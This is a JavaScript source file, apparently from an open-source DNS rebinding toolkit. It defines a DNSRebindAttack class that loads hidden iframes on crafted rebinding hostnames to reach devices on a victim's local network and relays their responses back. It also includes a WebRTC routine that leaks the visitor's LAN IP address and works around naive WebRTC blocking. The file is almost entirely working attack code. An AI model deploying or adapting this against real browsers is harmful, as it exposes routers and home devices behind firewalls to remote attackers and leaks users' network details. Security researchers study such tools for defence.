// The MIT License (MIT)
//
// Copyright (c) 2018 Brannon Dorsey
// (DNSRebind.getLocalIPAddress(...) function) Copyright (c) 2015 Daniel Roesler
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

// this class emits the following events:
//    - iframe-added
//    - iframe-removed
//    - all-iframes-added
class DNSRebindAttack extends EventEmitter {

    constructor(domain, port) {
        super()
        this.domain = domain
        this.port = port
        // this event emitter should be interface with via DNSRebind.nodes#on
        this.nodes = new EventEmitter()
        this.host2ip = new Map()
        const receiveAttackerMessage = this._receiveAttackerMessage.bind(this)
        window.addEventListener('message', receiveAttackerMessage, false)
    }

    attack(ips, firstIp='127.0.0.1', payload='payload.html', interval=250) {
        let timeout = 0
        ips.forEach(ip => {
            setTimeout(() => this._loadIframe(firstIp, ip, this.domain, this.port, payload), timeout += interval)
        })
        setTimeout(() => this.emit('all-iframes-added'), timeout)
    }

    static getLocalIPAddress() {
        return new Promise((resolve, reject) => {
            //get the IP addresses associated with an account
            const ipDups = {}
            //compatibility for firefox and chrome
            let RTCPeerConnection = window.RTCPeerConnection
                || window.mozRTCPeerConnection
                || window.webkitRTCPeerConnection;
            let useWebKit = !!window.webkitRTCPeerConnection
            //bypass naive webrtc blocking using an iframe

            if(!RTCPeerConnection){
               //NOTE: you need to have an iframe in the page right above the script tag
               //
               //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
               //<script>...getIPs called in here...
               //
               const iframe = document.createElement('iframe')
               iframe.id = 'DNSRebindWebRTCIframe'
               iframe.setAttribute('sandbox', 'allow-same-origin')
               iframe.style.display = 'none'
               document.body.appendChild(iframe)

               const win = iframe.contentWindow
               RTCPeerConnection = win.RTCPeerConnection
                   || win.mozRTCPeerConnection
                   || win.webkitRTCPeerConnection;
               useWebKit = !!win.webkitRTCPeerConnection;
            }
            //minimal requirements for data connection
            const mediaConstraints = {
                optional: [{ RtpDataChannels: true }]
            }

            const servers = { iceServers: [{ urls: "stun:stun.services.mozilla.com" }] }

            //construct a new RTCPeerConnection
            const pc = new RTCPeerConnection(servers, mediaConstraints)

            //listen for candidate events
            pc.onicecandidate = function(ice){
                //skip non-candidate events
                if(ice.candidate) handleCandidate(ice.candidate.candidate)
            }

            //create a bogus data channel
            pc.createDataChannel("")
            //create an offer sdp
            pc.createOffer(function(result){
                //trigger the stun server request
                pc.setLocalDescription(result, function(){}, function(){})
            }, function(){})

            //wait for a while to let everything finish
            setTimeout(function(){
                
                //read candidate info from local description
                var lines = pc.localDescription.sdp.split('\n')
                lines.forEach(function(line){
                    if(line.indexOf('a=candidate:') === 0) handleCandidate(line)
                })

                reject(Error('WebRTC could not determine the local IPv4 address'))
            }, 1000)

            function handleCandidate(candidate){
                
                //match just the IP address
                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
                const ip = ipRegex.exec(candidate)[1]

                // don't handle duplicates
                if(ipDups[ip] === undefined) {

                    //LAN IPv4
                    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
                        // only handle IPv4 LAN IPs right now, come back and support
                        // others
                        resolve(ip)
                    }
                    //IPv6 addresses
                    else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/)) {

                    }
                    //assume the rest are public IPv4s
                    else {

                    }
                }

                ipDups[ip] = true
            }
        })
    }

    _loadIframe(firstIp, secondIp, domain, port, payload) {
        const iframe = document.createElement('iframe')
        let host = `a.${firstIp}.1time.${secondIp}.forever.${this._uuidv4()}.${domain}`
        if (port != 80) host += `:${port}`
        host = host.toLowerCase()
        iframe.src = `http://${host}/${payload}`
        iframe.style = 'display: none;'
        document.body.appendChild(iframe)

        this.host2ip.set(`http://${host}`, secondIp)
        this.emit('iframe-added', secondIp, iframe.src )
    }

    _receiveAttackerMessage(event) {
          // Do we trust the sender of this message?  (might be
          // different from what we originally opened, for example).
          if (this.host2ip.has(event.origin.toLowerCase())) {
              // fire the event
              this.nodes.emit(event.data.name, event.data.ip, event.data.data)
              // remove an iframe if this is an 'end' event
              if (event.data.name == 'destroy') {
                  Array.from(document.getElementsByTagName('iframe')).forEach(iframe => {
                      if (iframe.getAttribute('src').includes(event.origin)) {
                          iframe.parentElement.removeChild(iframe)
                          this.emit('iframe-removed', event.data.ip, iframe.src)
                      }
                  })
              }
          }
    }

    _uuidv4() {
          return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            let r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8)
            return v.toString(16)
          })
    }
}
